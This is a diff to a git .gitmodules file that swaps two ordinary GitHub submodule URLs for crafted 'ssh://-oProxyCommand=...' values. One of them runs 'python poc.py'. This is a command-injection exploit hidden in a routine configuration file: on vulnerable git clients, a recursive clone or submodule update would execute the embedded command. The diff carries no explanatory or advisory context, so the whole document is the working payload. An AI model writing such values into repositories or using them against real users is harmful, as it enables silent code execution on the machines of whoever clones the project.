@@ -1,6 +1,6 @@
 [submodule "test"]
 	path = test
-	url = git://github.com/superirishdonkey/test.git
+	url = ssh://-oProxyCommand=cd hello/cert
 [submodule "world"]
 	path = world
-	url = git://github.com/superirishdonkey/world.git
+	url = ssh://-oProxyCommand=python poc.py/cert
